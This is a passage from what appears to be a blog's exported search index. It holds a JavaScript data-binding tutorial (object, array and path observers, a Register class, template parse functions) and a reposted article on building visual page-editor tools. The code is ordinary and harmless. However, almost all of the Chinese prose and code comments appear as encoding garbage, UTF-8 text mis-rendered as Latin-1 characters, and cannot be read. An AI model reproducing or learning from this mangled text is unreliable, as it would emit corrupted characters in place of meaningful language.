&apos;[object Object]&apos;) &#123; observeAllKey(old, callback) &#125; else &#123; //...åŒå‰æ–‡ï¼Œçœç•¥ &#125;&#125; å¯¹è±¡ä¸­æ•°ç»„çš„åŠ«æŒå¯¹äºå¯¹è±¡ä¸­çš„æ•°ç»„ï¼Œæˆ‘ä»¬ä½¿ç”¨é‡å†™æ•°ç»„çš„prototypeçš„æ–¹æ³•æ¥åŠ«æŒå®ƒ 12345678910111213141516171819function observeArray(arr, callback) &#123; const oam = [&apos;push&apos;, &apos;pop&apos;, &apos;shift&apos;, &apos;unshift&apos;, &apos;splice&apos;, &apos;sort&apos;, &apos;reverse&apos;] const arrayProto = Array.prototype const hackProto = Object.create(Array.prototype) oam.forEach(function(method)&#123; Object.defineProperty(hackProto, method, &#123; writable: true, enumerable: true, configurable: true, value: function(...arg) &#123; let old = arr.slice() let now = arrayProto[method].call(this, ...arg) callback(old, this, ...arg) return now &#125;, &#125;) &#125;) arr.__proto__ = hackProto&#125; å†™å®ŒåŠ«æŒæ•°ç»„çš„å‡½æ•°åï¼Œå°†å®ƒæ·»åŠ è¿›ä¸»å‡½æ•°ï¼š 12345678910function observer(obj, k, callback) &#123; let old = obj[k] if(Object.prototype.toString.call(old) === &apos;[object Array]&apos;) &#123; observeArray(old, callback) &#125; else if (old.toString() === &apos;[object Object]&apos;) &#123; observeAllKey(old, callback) &#125; else &#123; //... &#125;&#125; å¤„ç†è·¯å¾„å‚æ•°ä¹‹å‰æˆ‘ä»¬æ‰€æœ‰çš„æ–¹æ³•éƒ½æ˜¯é¢å¯¹å•ä¸ªkeyå€¼çš„ï¼Œå›æƒ³ä¸€ä¸‹æˆ‘ä»¬çš„æ¨¡ç‰ˆï¼Œæœ‰å¾ˆå¤šä¾‹å¦‚todos:todo:memberè¿™æ ·çš„è·¯å¾„ï¼Œæˆ‘ä»¬åº”è¯¥å…è®¸ä¼ å…¥ä¸€ä¸ªè·¯å¾„æ•°ç»„ï¼Œæ ¹æ®è·¯å¾„æ•°ç»„æ¥ç›‘å¬æŒ‡å®šçš„å¯¹è±¡æ•°æ® 123456789101112131415function observePath(obj, path, callback) &#123; let _path = obj let _key path.forEach((p, index) =&gt; &#123; if(parseInt(p) === p) &#123; p = parseInt(p) &#125; if(index &lt; path.length - 1) &#123; _path = _path[p] &#125; else &#123; _key = p &#125; &#125;) observer(_path, _key, callback)&#125; ä¹‹åå†å°†å®ƒæ·»åŠ è¿›ä¸»å‡½æ•°ï¼š 1234567891011121314function observer(obj, k, callback) &#123; if(Object.prototype.toString.call(k) === &apos;[object Array]&apos;) &#123; observePath(obj, k, callback) &#125; else &#123; let old = obj[k] if(Object.prototype.toString.call(old) === &apos;[object Array]&apos;) &#123; observeArray(old, callback) &#125; else if (old.toString() === &apos;[object Object]&apos;) &#123; observeAllKey(old, callback) &#125; else &#123; //... &#125; &#125;&#125; è¿™æ ·ï¼Œæˆ‘ä»¬å°±å®Œæˆäº†ç›‘å¬å‡½æ•°ã€‚ å¤šå¯¹ä¸€ç›‘è§†çš„å®ç°æœ‰å¯èƒ½ç»‘å®šæŸä¸ªæ•°æ®ç»“æ„çš„èŠ‚ç‚¹ä¸æ­¢ä¸€ä¸ªï¼Œæœ‰æ—¶æˆ‘ä»¬éœ€è¦ä¿®æ”¹å®Œæˆæ—¶åŒæ—¶é€šçŸ¥æ‰€æœ‰èŠ‚ç‚¹ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¿˜éœ€è¦ä¸€ä¸ªå•ç‹¬çš„æ¨¡å—è´Ÿè´£é€šçŸ¥æ‰€æœ‰èŠ‚ç‚¹ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸ºRegisteræ¨¡å—ï¼Œè´Ÿè´£é’ˆå¯¹ä¸åŒæ¨¡å—æ³¨å†Œä¸åŒçš„ä¸€ä¸ªæˆ–å¤šä¸ªå›è°ƒå‡½æ•°ã€‚ ç›‘è§†è€…çš„å®ç°1234567891011121314151617181920212223242526272829303132class Register &#123; constructor() &#123; //å­˜æ”¾æ‰€æœ‰å›è°ƒå¯¹è±¡ï¼Œå›è°ƒå¯¹è±¡ç”±ä¸‰ä¸ªkeyç»„æˆï¼šobj, key, fnï¼Œå…¶ä¸­fnåº”è¯¥æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œæ”¾ç€æ‰€æœ‰å‘ç”Ÿå˜åŒ–æ—¶è¦æ‰§è¡Œçš„å›è°ƒå‡½æ•° this.routes = [] &#125; //æ·»åŠ ä¸€ä¸ªå›è°ƒ regist(obj, k, fn) &#123; const _i = this.routes.find(function(el) &#123; if((el.key === k || el.key.toString() === k.toString()) &amp;&amp; Object.is(el.obj, obj)) &#123; return el &#125; &#125;) if(_i) &#123; //å¦‚æœå·²ç»å­˜åœ¨è¯¥objå’Œkeyç»„æˆçš„å¯¹è±¡ _i.fn.push(fn) &#125; else &#123; //å¦‚æœå°šä¸å­˜åœ¨ this.routes.push(&#123; obj: obj, key: k, fn: [fn] &#125;) &#125; &#125; //è§£æç»“æŸæ—¶è°ƒç”¨ï¼Œç»‘å®šæ‰€æœ‰å›è°ƒ build() &#123; this.routes.forEach((route) =&gt; &#123; observer(route.obj, route.key, route.fn) &#125;) &#125;&#125; observeræ¨¡å—çš„ä¿®æ”¹ç”±äºç°åœ¨ä¸€ä¸ªkeyå¯èƒ½å¯¹åº”å¤šä¸ªå›è°ƒæ“ä½œäº†ï¼Œéœ€è¦å¯¹observerè¿›è¡Œä¿®æ”¹ï¼š 123456789101112131415function observer(obj, k, callback) &#123; //...ä¸å‰æ–‡ç›¸åŒ if(now !== old) &#123; callback.forEach((fn) =&gt; &#123; fn(old, now) &#125;) &#125;&#125;function observerArray(arr, callback) &#123; //...ä¸å‰æ–‡ç›¸åŒ //å°†åŸæ¥çš„callback(old, this, ...arg)æ›¿æ¢ä¸º callback.forEach((fn) =&gt; &#123; fn(old, this, ...arg) &#125;)&#125; ç»‘å®šæ¨¡ç‰ˆä¸æ•°æ®ç°åœ¨ï¼Œæˆ‘ä»¬è¦åœ¨è§£æè¿‡ç¨‹ä¸­æ·»åŠ å¯¹æ•°æ®çš„ç›‘è§†äº†ï¼Œè¿˜è®°å¾—ä¹‹å‰çš„parseç³»åˆ—å‡½æ•°å—ï¼Ÿ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051const register = new Register()function parseModel(node) &#123; if(node.getAttribute(&apos;data-model&apos;)) &#123; //...ä¹‹å‰é€»è¾‘ä¸å˜ register.regist(data, _data.path, function(old, now) &#123; if(node.tagName === &apos;INPUT&apos;) &#123; node.value = now &#125; else &#123; node.innerText = now &#125; //æ·»åŠ consoleä¾¿äºè°ƒè¯• console.log(`$&#123;old&#125; ---&gt; $&#123;now&#125;`) &#125;) &#125;&#125;function parseClass(node) &#123; if(node.getAttribute(&apos;data-class&apos;)) &#123; //... register.regist(data, _data.path, function(old, now) &#123; node.classList.remove(old) node.classList.add(now) console.log(`$&#123;old&#125; ---&gt; $&#123;now&#125;`) &#125;) &#125;&#125;//å½“åˆ—è¡¨å‘ç”Ÿå˜åŒ–æ—¶ï¼Œä¸ºäº†ç®€å•ç›´æ¥é‡æ–°æ¸²æŸ“äº†å½“å‰åˆ—è¡¨function parseList(node) &#123; //... register.regist(data, _listData.path, () =&gt; &#123; while(node.firstChild) &#123; node.removeChild(node.firstChild) &#125; const _listData = parseData(_list, node) node.appendChild(_item) _listData.data.forEach((_dataItem, index) =&gt; &#123; const _copyItem = _item.cloneNode(true) if(node.path) &#123; _copyItem.path = node.path.slice() &#125; if(!_copyItem.path) &#123; _copyItem.path = [] &#125; _copyItem.path.push(index) scan(_copyItem) node.insertBefore(_copyItem, _item) &#125;) node.removeChild(_item) &#125;)&#125;//å½“æ¨¡ç‰ˆè§£æç»“æŸåç»‘å®šæ‰€æœ‰äº‹ä»¶register.build()]]></content>
      <categories>
        <category>Webå‰ç«¯</category>
      </categories>
      <tags>
        <tag>Webå‰ç«¯</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·æŠ€æœ¯è¦ç‚¹]]></title>
    <url>%2F2019%2F09%2F21%2FWeb%E5%89%8D%E7%AB%AF%2F%E9%A1%B5%E9%9D%A2%E5%8F%AF%E8%A7%86%E5%8C%96%E6%90%AD%E5%BB%BA%E5%B7%A5%E5%85%B7%E6%8A%80%E6%9C%AF%E8%A6%81%E7%82%B9%2F</url>
    <content type="text"><![CDATA[è½¬è½½è‡ªæ˜é‡‘ï¼Œä½œè€…CntChenï¼ŒåŸæ–‡é“¾æ¥ï¼šhttps://juejin.im/post/5c627cce6fb9a049cd54ade1 èƒŒæ™¯é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·, æ˜¯äº’è”ç½‘å…¬å¸ä¸­å¸¸è§çš„è¿è¥å·¥å…·, å®ç°äº†è¿è¥äººå‘˜å¿«é€Ÿç”Ÿæˆå’Œå‘å¸ƒé¡µé¢, æå‡é¡µé¢ä¸Šçº¿æ•ˆç‡; ä¸”æ— éœ€å¼€å‘äººå‘˜ä»‹å…¥, èŠ‚çœå¼€å‘äººåŠ›. é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·æ­å»ºå‡ºçš„é¡µé¢ç¤ºä¾‹: ä½†ä»é›¶å¼€å§‹è®¾è®¡å’Œå¼€å‘å‡ºè¿™ç§å·¥å…·å¹¶ä¸ç®€å•. ç¬”è€…ç»´æŠ¤çš„é¡µé¢å¯è§†åŒ–æ­å»ºæ¡†æ¶ pipeline, æä¾›äº†é¡µé¢å¯è§†åŒ–æ­å»ºçš„æ ¸å¿ƒåŠŸèƒ½, å…å»ä»é›¶å®ç°é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·çš„å›°éš¾. æœ¬æ–‡ä¸»è¦åŒ…å«ä»¥ä¸‹å†…å®¹: æ´»åŠ¨é¡µé¢é‡å¤å¼€å‘çš„ç—›ç‚¹. å¼€å‘å¯è§†åŒ–æ­å»ºå·¥å…·çš„æŠ€æœ¯è¦ç‚¹. ç†æƒ³çš„è¿è¥é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·. å¼€æºé¡µé¢æ­å»ºæ¡†æ¶ pipeline ä»‹ç». æ´»åŠ¨é¡µé¢å¼€å‘ä¹‹ç—›æ´»åŠ¨é¡µé¢ç‰¹ç‚¹å‰ç«¯ä¸šåŠ¡ä¸­, ç»å¸¸éœ€è¦å¼€å‘äº§å“ä»‹ç»é¡µ/è¥é”€é¡µ/æ´»åŠ¨é¡µ/å›¾ç‰‡å±•ç¤ºé¡µç­‰é¡µé¢. è¿™ç±»éœ€æ±‚æœ‰ä»¥ä¸‹å‡ ä¸ªç‰¹ç‚¹: é¡µé¢ç±»ä¼¼: é¡µé¢å¸ƒå±€å’Œä¸šåŠ¡é€»è¾‘è¾ƒå›ºå®š. éœ€æ±‚é«˜é¢‘: æ¯å‘¨ç”šè‡³æ¯å¤©æœ‰å¤šä¸ªè¿™ç§éœ€æ±‚. è¿­ä»£å¿«é€Ÿ: å¼€å‘æ—¶é—´çŸ­, ä¸Šçº¿æ—¶é—´ç´§. å¼€å‘æ€§ä»·æ¯”ä½: å¼€å‘ä»»åŠ¡é‡å¤, æ¶ˆè€—å„æ–¹çš„æ²Ÿé€šæ—¶é—´å’ŒäººåŠ›. æ´»åŠ¨é¡µé¢å¸¸è§„å¼€å‘æµç¨‹æ´»åŠ¨é¡µé¢å¸¸è§„å¼€å‘æµç¨‹å›¾ æµç¨‹ è¿è¥/äº§å“æå‡ºé¡µé¢éœ€æ±‚. èµ°é¡¹ç›®æµç¨‹è¿›å…¥å¼€å‘ç¯èŠ‚. å¼€å‘æ ¹æ®è®¾è®¡ç¨¿å®Œæˆé¡µé¢å¼€å‘. æµ‹è¯•è¿›è¡Œé¡µé¢æµ‹è¯•. è¿ç»´è¿›è¡Œé¡µé¢ä¸Šçº¿. è¿è¥/äº§å“è¿›è¡Œé¡µé¢éªŒæ”¶. ç—›ç‚¹ æ–¹å¤šå‚ä¸, åå¤æ²Ÿé€š, ä¸²è¡Œæµç¨‹. é¡µé¢ä¸Šçº¿å‘¨æœŸé•¿, æ— æ³•å¿«é€Ÿå“åº”æ´»åŠ¨éœ€æ±‚. äººåŠ›é™·å…¥é‡å¤å·¥ä½œæ³¥æ½­, å¿™ç¢Œè€Œä½æ•ˆ. æ›´ä¼˜çš„æµç¨‹å¯¹äºé«˜é¢‘å’Œé‡å¤çš„æ´»åŠ¨é¡µé¢å¼€å‘, ä¸šç•Œä¸€èˆ¬å°†é¡µé¢åšæˆé…ç½®åŒ–, é…ç½®å·¥ä½œä»å¼€å‘äººå‘˜äº¤æ¥ç»™äº§å“/è¿è¥ç­‰éœ€æ±‚æ–¹; å¼€å‘å’Œè®¾è®¡äººå‘˜åªéœ€æä¾›é…ç½®åŒ–é¡µé¢æ”¯æŒ. æ›´ä¼˜çš„æ´»åŠ¨é¡µé¢ç”Ÿæˆæµç¨‹ä¾é é¡µé¢å¯è§†åŒ–æ­å»ºç³»ç»Ÿæ¥å®ç°. æ›´ä¼˜çš„æ´»åŠ¨é¡µé¢å¼€å‘æµç¨‹å›¾ æµç¨‹ è¿è¥/äº§å“æå‡ºé¡µé¢éœ€æ±‚. è¿è¥/äº§å“åœ¨é¡µé¢å¯è§†åŒ–æ­å»ºç³»ç»Ÿä¸­é€‰å–åˆé€‚çš„é¡µé¢æ¨¡æ¿è¿›è¡Œé¡µé¢æ­å»º. é¡µé¢è‡ªåŠ¨åŒ–å‘å¸ƒä¸Šçº¿, é¡µé¢éœ€æ±‚å®Œæˆ, æµç¨‹å®Œç»“. å¦‚æœè¿è¥/äº§å“æ²¡æœ‰æ‰¾åˆ°åˆé€‚çš„æ¨¡æ¿. å¼€å‘è¿›è¡Œé¡µé¢æ¨¡æ¿å¼€å‘, å¹¶å°†é¡µé¢æ¨¡æ¿æ·»åŠ åˆ°é¡µé¢å¯è§†åŒ–æ­å»ºç³»ç»Ÿä¸­. è¿è¥/äº§å“ç»§ç»­æµç¨‹2. åŒæ—¶, éšç€é¡µé¢å¯è§†åŒ–æ­å»ºç³»ç»Ÿä¸­çš„é¡µé¢æ¨¡æ¿ä¸æ–­ä¸°å¯Œ, æ–°çš„é¡µé¢éœ€æ±‚å¯¹å¼€å‘äººå‘˜çš„ä¾èµ–é€æ¸å‡ä½, å¯ç”±è¿è¥/äº§å“ç›´æ¥å®Œæˆ. é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·æ›´ä¼˜çš„æ´»åŠ¨é¡µé¢å¼€å‘æµç¨‹ä¾é é¡µé¢å¯è§†åŒ–æ­å»ºç³»ç»Ÿå®ç°, é‡ç‚¹æ˜¯è¦æœ‰é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·æä¾›æŠ€æœ¯æ”¯æŒ. é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·é€šè¿‡å¡«å†™é…ç½®æ•°æ®è¡¨å•, æ‹–æ‹‰é¡µé¢ç»„ä»¶ç­‰å¯è§†åŒ–çš„é¡µé¢ç¼–è¾‘æ–¹å¼, å®ç°é¡µé¢çš„ç”Ÿæˆæˆ–ä¿®æ”¹. ä½†ä»é›¶å¼€å§‹è®¾è®¡å’Œå¼€å‘å‡ºé¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·å¹¶ä¸ç®€å•, æœ‰å‡ ä¸ªéœ€è¦äº†è§£å’Œå…³æ³¨çš„æŠ€æœ¯ç‚¹. é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·çš„æŠ€æœ¯è¦ç‚¹ä»æŠ€æœ¯è§’åº¦, è®¾è®¡å’Œå¼€å‘ä¸€ä¸ªé¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·æ—¶, éœ€è¦è€ƒè™‘ä»¥ä¸‹å‡ ä¸ªæŠ€æœ¯è¦ç‚¹: é¡µé¢ç»„ä»¶åŒ– é¡µé¢æ¨¡æ¿ é¡µé¢å¯è§†åŒ–ç¼–è¾‘ ç»„ä»¶å±‚çº§å…³ç³» é¡µé¢æ‰“åŒ… å®æ—¶é¢„è§ˆ é¡µé¢ç»„ä»¶å¼€å‘ é¡µé¢ç»„ä»¶åŒ–ç»„ä»¶åŒ–çš„ä¼˜ç‚¹é¡µé¢çš„åŸºæœ¬å•å…ƒæ˜¯ HTML å…ƒç´ , ä½†æ˜¯ HTML å…ƒç´ æ— æ³•åŒ…å«ä¸šåŠ¡é€»è¾‘, ä¸”ç”± HTML å…ƒç´ ç›´æ¥ç»„åˆå‡ºé¡µé¢, è¿‡äºç¹æ‚å’Œä½æ•ˆ. å›¾ç‰‡æ¥æº: é¡µé¢è¾ƒå¥½çš„ç»„ç»‡æ–¹å¼æ˜¯ç»„ä»¶åŒ–, å¦‚ä¸Šå›¾æ‰€ç¤º. ç»„ä»¶æ˜¯å¯¹ HTML å…ƒç´ ã€å…ƒç´ å¸ƒå±€å’Œæ ·å¼ã€ä¸šåŠ¡é€»è¾‘çš„å°è£…. é€šè¿‡ç»„ä»¶å°è£…ä¸šåŠ¡é€»è¾‘, å¹¶é€šè¿‡ç»„ä»¶å±æ€§(Props)å‘å¤–æš´éœ²ç»„ä»¶çš„é…ç½®å­—æ®µ. é‡‡ç”¨é¡µé¢ç»„ä»¶åŒ–, å¤æ‚çš„é¡µé¢å¯è§†åŒ–æ­å»ºå¯ä»¥è½¬åŒ–ä¸º2ä¸ªè¾ƒç®€å•çš„æ“ä½œ: ç»„ä»¶æ ‘ç»„åˆ, é¡µé¢å¯è§†åŒ–æ­å»ºå˜æˆé¡µé¢ç»„ä»¶çš„å¯è§†åŒ–ç»„åˆ. ç»„ä»¶é…ç½®ç¼–è¾‘, å°†å¯¹é¡µé¢å†…å®¹çš„ç¼–è¾‘è½¬åŒ–ä¸ºå¯¹ç»„ä»¶çš„é…ç½®å±æ€§(props)ä¿®æ”¹. é¡µé¢å‰ç«¯æ¡†æ¶é¡µé¢ç»„ä»¶åŒ–éœ€ä¾é å‰ç«¯æ¡†æ¶æ¥å®ç°. é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·çš„æ¶æ„æ–¹å¼å¯¹é¡µé¢å‰ç«¯æ¡†æ¶æœ‰é™åˆ¶: éœ€é€‰æ‹©é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·æ”¯æŒçš„å‰ç«¯æ¡†æ¶. å¦‚: é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·åªæ”¯æŒåŸºäº vue çš„é¡µé¢, é‚£é¡µé¢ç»„ä»¶åŒ–çš„å‰ç«¯æ¡†æ¶åªèƒ½é€‰æ‹© vue. ä½†æ˜¯å‰ç«¯æŠ€æœ¯å›¢é˜Ÿé€‰ç”¨çš„å‰ç«¯æ¡†æ¶, ä¸€èˆ¬å·²ç”¨äºæ”¯æŒç°æœ‰ä¸šåŠ¡, å¹¶æ²‰æ·€äº†ä¸€å®šæ•°é‡çš„æŠ€æœ¯ç»„ä»¶å’Œä¸šåŠ¡ç»„ä»¶. å¦‚æœéœ€è¦é’ˆå¯¹é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·è¿›è¡Œå‰ç«¯æ¡†æ¶çš„åˆ‡æ¢, æˆæœ¬å°†ä¼šå¾ˆå¤§. æ‰€ä»¥ç†æƒ³çš„é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·, åº”è¯¥å’Œé¡µé¢çš„å‰ç«¯æ¡†æ¶è§£å¶, å¦‚ä¸‹å›¾æ‰€ç¤º. æŠ€æœ¯å›¢é˜Ÿåœ¨æŸå‰ç«¯æ¡†æ¶ä¸­æ²‰æ·€çš„æŠ€æœ¯ç»„ä»¶å’Œä¸šåŠ¡ç»„ä»¶, å¯åœ¨é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·çš„é¡µé¢ä¸­å¤ç”¨. æŠ€æœ¯éš¾ç‚¹1:é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·ä¸é¡µé¢å‰ç«¯æ¡†æ¶è§£å¶. å½“ç„¶, å‰ç«¯ä¸šåŠ¡å·²é€‰ç”¨äº†æŸå‰ç«¯æ¡†æ¶, å¼€å‘ä¸“é—¨æ”¯æŒè¯¥å‰ç«¯æ¡†æ¶çš„é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·, ä¹Ÿæ˜¯é«˜æ•ˆå®ç°ç›®æ ‡çš„é€‰æ‹©. é¡µé¢æ¨¡æ¿é¡µé¢æ¨¡æ¿åŒ…å«å®Œæ•´çš„ä¸šåŠ¡é€»è¾‘, æœ‰åŠ©äºå¿«é€Ÿç”Ÿæˆä¸šåŠ¡é¡µé¢. ä¸åŒçš„é¡µé¢æ¨¡æ¿é€‚ç”¨äºä¸åŒçš„ä¸šåŠ¡åŠŸèƒ½, ä»æ¨¡æ¿åº“ä¸­é€‰æ‹©åˆé€‚çš„é¡µé¢æ¨¡æ¿å¹¶æ´¾ç”Ÿå‡ºé»˜è®¤ä¸šåŠ¡é¡µé¢, å†å¯¹é»˜è®¤é¡µé¢è¿›è¡Œå¯è§†åŒ–ç¼–è¾‘, ä»è€Œç”Ÿæˆç›®æ ‡ä¸šåŠ¡é¡µé¢. äº‘å‡¤è¶çš„é¡µé¢æ¨¡æ¿åˆ—è¡¨: æ¨¡æ¿å¸¦æœ‰é¡µé¢çš„é»˜è®¤æ•°æ®; å¯¹äºç»„ä»¶åŒ–çš„é¡µé¢, æ¨¡æ¿æ˜¯ä»ç»„ä»¶åº“ä¸­é€‰å–éƒ¨åˆ†ç»„ä»¶, å¹¶å¸¦æœ‰å„ä¸ªç»„ä»¶çš„é»˜è®¤é…ç½®æ•°æ®. å¦‚ä¸Šå›¾æ‰€ç¤º, é¡µé¢ç»„ä»¶åº“ä¸­æœ‰ç»„ä»¶A, ç»„ä»¶B, ç»„ä»¶C, ç»„ä»¶D, â€¦, ç»„ä»¶Xç­‰. é¡µé¢æ¨¡æ¿ä¸€ç”±ç»„ä»¶åº“ä¸­çš„ç»„ä»¶A, ç»„ä»¶Bå’Œç»„ä»¶Cç»„æˆ, å®ç°äº†ä¸€ä¸ªå®Œæ•´çš„ä¸šåŠ¡åŠŸèƒ½; é¡µé¢æ¨¡æ¿äºŒç”±ç»„ä»¶åº“ä¸­çš„ç»„ä»¶A, ç»„ä»¶Bå’Œç»„ä»¶Xç»„æˆ, å®Œæˆå¦ä¸€ä¸ªå®Œæ•´çš„ä¸šåŠ¡åŠŸèƒ½. é¡µé¢ç¼–è¾‘é¡µé¢ç”±é¡µé¢ç»„ä»¶ç»„åˆè€Œæˆ, é¡µé¢çš„ç¼–è¾‘å…¶å®æ˜¯å¯¹é¡µé¢ç»„ä»¶è¿›è¡Œé‡æ–°ç»„åˆ, å¹¶ç¼–è¾‘å„é¡µé¢ç»„ä»¶çš„å†…å®¹. é¡µé¢ç¼–è¾‘åŒ…å«2ä¸ªéƒ¨åˆ†: ç¼–è¾‘é¡µé¢ç»„ä»¶å’Œç¼–è¾‘é¡µé¢å†…å®¹. ç¼–è¾‘é¡µé¢ç»„ä»¶ç»„ä»¶æ ‘ä½¿ç”¨ç»„ä»¶åŒ–çš„æ–¹å¼æ¥ç»„ç»‡é¡µé¢, é¡µé¢å¯ä»¥è®¤ä¸ºæ˜¯ä¸€æ£µç»„ä»¶æ ‘, å¦‚ä¸‹å›¾æ‰€ç¤º, æ ‘ä¸­çš„èŠ‚ç‚¹ä¸ºé¡µé¢ç»„ä»¶, é¡µé¢ç»„ä»¶å¯ä»¥åŒ…å«å­ç»„ä»¶. åœ¨ä»£ç ç¼–å†™ä¸Š, é€šè¿‡ç»„ä»¶æ ‡ç­¾çš„ç»„åˆæ¥å£°æ˜ä¸€æ£µç»„ä»¶æ ‘, å¹¶åœ¨æ‰“åŒ…æ—¶ç”Ÿæˆé¡µé¢èµ„æº, åœ¨è¿è¡Œæ—¶åŠ è½½é¡µé¢èµ„æºæ¸²æŸ“å‡ºé¡µé¢. react å’Œ vue çš„ç»„ä»¶æ ‘å£°æ˜ç¤ºä¾‹: ç¼–è¾‘é¡µé¢ç»„ä»¶çš„ä¸€ä¸ªå¯è¡Œæ–¹å¼æ˜¯: åŠ¨æ€åœ°ç»™é¡µé¢æºç æ·»åŠ ç»„ä»¶, ç„¶åé‡æ–°æ‰“åŒ…ç”Ÿæˆé¡µé¢. å¦‚é€šè¿‡å¯è§†åŒ–çš„æ–¹å¼æ›¿æ¢ Leftç»„ä»¶ ä¸º NewLeftç»„ä»¶ å, å¯¹æºç çš„ç»„ä»¶æ ‘å£°æ˜åšæ›¿æ¢, å°† Left æ ‡ç­¾æ›¿æ¢ä¸º NewLeft æ ‡ç­¾. åŠ¨æ€ç»„ä»¶ä¸€äº›å‰ç«¯æ¡†æ¶æ”¯æŒåŠ¨æ€ç»„ä»¶, å¯ä»¥æ ¹æ®ç»„ä»¶æ ‘å£°æ˜åŠ¨æ€æ¸²æŸ“å‡ºç»„ä»¶, è€Œæ— éœ€åœ¨æ„å»ºå‰å°±å®šä¹‰å¥½é¡µé¢çš„ç»„ä»¶æ ‘ç»“æ„. å¯¹åŠ¨æ€ç»„ä»¶é¡µé¢å®ç°å¯è§†åŒ–ç»„ä»¶ç¼–è¾‘æ—¶, å¯ä»¥åªç¼–è¾‘ç»„ä»¶æ ‘å£°æ˜æ–‡ä»¶, ç„¶åå°†ç»„ä»¶æ ‘å£°æ˜ä¼ å…¥æå‰æ‰“åŒ…å¥½çš„é¡µé¢ä¸­è¿›è¡Œæ¸²æŸ“. é‡‡ç”¨åŠ¨æ€ç»„ä»¶å¯ä»¥é¿å…é‡æ–°æ‰“åŒ…çš„è€—æ—¶, å¿«é€Ÿç”Ÿæˆæ–°é¡µé¢. Vue æ ¹æ®ç»„ä»¶æ ‘å£°æ˜åŠ¨æ€åœ°æ¸²æŸ“ç»„ä»¶ç¤ºä¾‹å¦‚ä¸‹å›¾, vue åŠ¨æ€ç»„ä»¶ä½¿ç”¨ compontent å…³é”®å­—æ¥å£°æ˜, å¹¶é€šè¿‡ is å±æ€§æ¥å†³å®šå®ä¾‹åŒ–çš„å…·ä½“ç»„ä»¶. å¯¹äº react, ç»„ä»¶æ˜¯ä¸€ä¸ª js å¯¹è±¡, ç›´æ¥åœ¨ jsx ä¸­æŒ‰ç…§ç»„ä»¶åç§°è¿”å›å¯¹åº”ç»„ä»¶å°±å¯ä»¥äº†. ç¼–è¾‘é¡µé¢å†…å®¹ç»„ä»¶åŒ–é¡µé¢çš„é¡µé¢å†…å®¹ç¼–è¾‘, æ˜¯å¯¹é¡µé¢ä¸­å„ä¸ªç»„ä»¶çš„ç»„ä»¶å±æ€§(Props)è¿›è¡Œé…ç½®. ç»„ä»¶é…ç½®æ•°æ®ä¸€ä¸ªç»„ä»¶åŒ…å«ç»„ä»¶å±æ€§(Props), ç»„ä»¶çŠ¶æ€(State), ç»„ä»¶HTMLæ¨¡æ¿(Template), ç»„ä»¶ä¸šåŠ¡é€»è¾‘(Javascript), ç»„ä»¶æ ·å¼å¸ƒå±€(Style)ç­‰å‡ ä¸ªéƒ¨åˆ†. ç»„ä»¶çš„é…ç½®æ•°æ®é€šè¿‡ç»„ä»¶æš´éœ²çš„ Props æ³¨å…¥åˆ°ç»„ä»¶ä¸­, åœ¨ç»„ä»¶å†…éƒ¨ Props ä½œä¸ºå¸¸é‡åˆ†å‘ç»™ State, Template, Javascript, Style ç­‰å…¶ä»–ç»„ä»¶å†…å®¹, ç”±ç»„ä»¶å†…å®¹æ¸²æŸ“å‡ºè§†å›¾. ç»„ä»¶å·®å¼‚åŒ–ç»„ä»¶æ˜¯ä¸šåŠ¡å†…å®¹çš„å‘ˆç°è½½ä½“, ä¸åŒçš„ä¸šåŠ¡å†…å®¹, å°è£…åœ¨ä¸åŒçš„ä¸šåŠ¡ç»„ä»¶ä¸­. æ‰€ä»¥é¡µé¢æ¨¡æ¿ä¸­çš„ç»„ä»¶æ˜¯å·®å¼‚åŒ–çš„, å·®å¼‚ç‚¹ä½“ç°åœ¨ç»„ä»¶çš„ Props, State, Template, Javascript, Style ç­‰ç»„ä»¶å†…å®¹ä¸Š. åœ¨ç¼–è¾‘ä¸åŒç»„ä»¶å†…å®¹æ—¶, ç»„ä»¶é…ç½®æ•°æ®çš„æ•°æ®ç»“æ„æ˜¯ä¹Ÿæ˜¯å·®å¼‚åŒ–çš„. å¦‚ä¸‹å›¾ç¤ºçš„é¡µé¢åŒ…å«3ä¸ªç»„ä»¶: å¤´éƒ¨ç»„ä»¶, é—´éš”åŒºç»„ä»¶å’Œå¤©æ°”ç»„ä»¶. å¤´éƒ¨ç»„ä»¶çš„é…ç½®æ•°æ®ä¸ºå¤´éƒ¨æ ‡é¢˜å’Œå¤´éƒ¨å›¾ç‰‡ç­‰; é—´éš”å»ç»„ä»¶çš„é…ç½®æ•°æ®ä¸ºé—´éš”æç¤ºæ–‡æœ¬ç­‰; å¤©æ°”ç»„ä»¶çš„é…ç½®æ•°æ®ä¸ºåŸå¸‚åç§°. ä¸åŒçš„ç»„ä»¶éœ€è¦ä¸åŒçš„é…ç½®æ•°æ®. éœ€è¦ä¸ºå„ç»„ä»¶å·®å¼‚åŒ–çš„é…ç½®æ•°æ®å®šä¹‰æ•°æ®ç»“æ„å’Œå­—æ®µç±»å‹, ç†æƒ³çš„é…ç½®æ•°æ®æ ¼å¼ä¸º JSON, å› ä¸ºå…¶æ ¼å¼çµæ´», æ”¯æŒæ•°æ®åµŒå¥—, ä¸”å‰ç«¯å‹å¥½. 